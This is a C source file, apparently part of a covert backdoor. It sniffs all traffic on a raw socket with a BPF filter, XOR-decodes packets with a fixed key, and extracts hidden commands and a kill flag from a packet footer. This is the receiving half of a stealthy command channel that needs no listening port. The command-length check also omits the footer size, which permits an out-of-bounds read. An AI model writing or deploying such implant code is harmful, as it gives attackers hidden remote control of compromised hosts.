#include <arpa/inet.h>
#include <linux/filter.h>
#include <linux/if_ether.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#include "common.h"
#include "networking.h"

int CreateRawFilterSocket(struct sock_fprog* bpf)
{
    int sock = -1;

    if (NULL == bpf)
    {
        (void)fprintf(stderr, "bpf can not be NULL\n");
        goto end;
    }

    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (-1 == sock)
    {
        (void)fprintf(stderr, "Could not create raw sock\n");
        goto end;
    }

    if (setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, bpf, sizeof(*bpf)))
    {
        perror("setsockopt failed");
        (void)fprintf(stderr, "Could not set socket options\n");
        goto clean;
    }

    goto end;

clean:
    close(sock);
    sock = -1;
end:
    return sock;
}

int AcceptPacket(int raw_sock, unsigned char** packet_data)
{
    int exit_code = EXIT_FAILURE;
    const int recv_size = 5000;  // arbitrary size for receiving packets
    ssize_t bytes_recv = 0;
    footer_t packet_footer = {0};
    unsigned char* raw = NULL;
    unsigned char* cmd = NULL;

    if (NULL == packet_data || NULL != *packet_data)
    {
        (void)fprintf(stderr, "packet_data must be a NULL double pointer\n");
        goto end;
    }

    if (raw_sock < 0)
    {
        (void)fprintf(stderr, "raw_sock must be a valid fd\n");
        goto end;
    }

    raw = calloc(recv_size, sizeof(*raw));
    if (NULL == raw)
    {
        (void)fprintf(stderr, "Failed to calloc raw\n");
        goto end;
    }

    // arbitrary size for receiving packets, as we only care about the data at the end
    bytes_recv = recv(raw_sock, raw, recv_size, 0);
    if (bytes_recv < 0)
    {
        (void)fprintf(stderr, "Failed to receive data on raw_sock\n");
        goto end;
    }

    printf("Packet received");

    for (ssize_t i = 0; i < bytes_recv; ++i)
    {
        raw[i] ^= 0x4f;
    }

    memcpy(&packet_footer, raw + bytes_recv - sizeof(packet_footer), sizeof(packet_footer));
    packet_footer.cmd_len = ntohl(packet_footer.cmd_len);

    if (packet_footer.flag == KILL_SERVER)
    {
        printf("Received KILL_SERVER command\n");
        exit_code = EXIT_KILL_SERVER;
        goto end;
    }

    if (packet_footer.cmd_len > bytes_recv)
    {
        (void)fprintf(stderr, "Command length is larger than received data\n");
        goto end;
    }

    cmd = calloc(packet_footer.cmd_len + 1, sizeof(*cmd));
    if (NULL == cmd)
    {
        (void)fprintf(stderr, "Failed to calloc cmd\n");
        goto end;
    }

    memcpy(cmd, raw + bytes_recv - packet_footer.cmd_len - sizeof(footer_t), packet_footer.cmd_len);

    printf("Command received: %s\n", cmd);
    *packet_data = cmd;
    exit_code = EXIT_SUCCESS;
    goto end;

end:
    NFREE(raw);
    return exit_code;
}